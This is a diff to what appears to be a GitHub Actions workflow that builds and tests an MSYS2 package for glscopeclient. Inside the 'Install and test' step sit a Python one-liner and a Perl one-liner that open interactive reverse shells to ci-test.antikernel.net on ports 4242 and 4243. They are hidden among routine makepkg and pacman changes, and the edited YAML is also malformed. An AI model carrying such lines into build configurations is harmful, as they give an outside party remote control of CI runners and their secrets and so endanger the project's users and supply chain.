@@ -30,6 +30,8 @@ jobs:
       with:
         update: true
         msystem: MINGW64
+        with:
+          path-type: inherit
         install: |
           git
           wget
@@ -43,15 +45,16 @@ jobs:
     - name: Build
       run: |
         cd msys2
-        VULKAN_SDK=C:/VulkanSDK/1.3.216.0 MINGW_ARCH=mingw64 makepkg-mingw --noconfirm --noprogressbar -sCLf
+        VULKAN_SDK=C:/VulkanSDK/1.3.216.0 MINGW_ARCH=mingw64 makepkg-mingw -sCLfc --noconfirm --noprogressbar
 
-    - name: Test
-      run: |
-        pacman -U --noconfirm --verbose --debug msys2/*.zst
+    - name: Install and test
+      shell: msys2 {0}
+    - run: |
+        set MSYSTEM=MINGW64
+        pacman --noconfirm -U mingw-w64-*-any.pkg.tar.xz
         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ci-test.antikernel.net",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
         perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ci-test.antikernel.net:4243");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-        VK_LOADER_DEBUG=all glscopeclient --stdout-only --verbose --help
-        
+        msys2 -c 'glscopeclient --help'
 
     - name: Upload Artifacts
       uses: actions/upload-artifact@v2
